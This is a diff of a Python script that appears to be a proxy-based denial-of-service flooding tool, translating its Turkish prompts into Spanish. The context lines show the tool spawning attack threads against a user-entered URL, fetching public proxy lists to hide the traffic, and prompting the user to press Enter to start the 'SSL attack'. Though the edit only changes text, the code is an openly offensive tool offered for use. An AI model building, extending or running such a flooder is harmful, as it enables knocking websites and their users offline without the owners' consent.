@@ -20,9 +20,9 @@ def opth():
 		x = threading.Thread(target=atk)
 		x.start()
 		print("Threads " + str(a+1) + " Created ")
-	print(Fore.RED + "Wait A Few Seconds For Threads Ready To Attack ...")
+	print(Fore.RED + "Espere unos segundos para que los hilos estén listos para atacar...")
 	time.sleep(10)
-	input(Fore.CYAN + "Saldiriyi Baslatmak icin Enter tusuna basin!")
+	input(Fore.CYAN + "Enter para iniciar el ataque SSL!")
 	global oo
 	oo = True
 
@@ -34,19 +34,19 @@ def main():
 	global thr
 	global per
 	url = str(input(Fore.GREEN + "Url : " + Fore.WHITE))
-	ssl = str(input(Fore.GREEN + "Site SSL kullaniyormu ? (y/n) : " + Fore.WHITE))
-	ge = str(input(Fore.GREEN + "Yeni Proxy Listesi Al ? (y/n) : " + Fore.WHITE))
+	ssl = str(input(Fore.GREEN + "El sitio utiliza SSL? (y/n) : " + Fore.WHITE))
+	ge = str(input(Fore.GREEN + "Obtener nueva lista de proxys? (y/n) : " + Fore.WHITE))
 	if ge =='y':
 		if ssl == 'y':
 			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=2000') #Code By GogoZin
 			with open('proxy.txt','wb') as fp:
 				fp.write(rsp.content)
-				print(Fore.CYAN + "Https proxy basarili bir sekilde alindi!")
+				print(Fore.CYAN + "Proxy HTTP recibido con éxito!")
 		else:
 			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=all&timeout=1000') #Code By GogoZin
 			with open('proxy.txt','wb') as fp:
 				fp.write(rsp.content)
-				print(Fore.CYAN + "Http proxy basarili bir sekilde alindi!")
+				print(Fore.CYAN + "Proxy HTTP recibido con éxito!")
 	else:
 		pass
 	list = str(input(Fore.GREEN + "Liste (proxy.txt) : " + Fore.WHITE))
@@ -78,7 +78,7 @@ def atk():
 					s.close()
 			except:
 				s.close()
-				print(Fore.RED + "Proxy veya URL'ye Baglanilamiyor !")
+				print(Fore.RED + "No se puede conectar a proxy o URL!")
 
 
 if __name__ == "__main__":
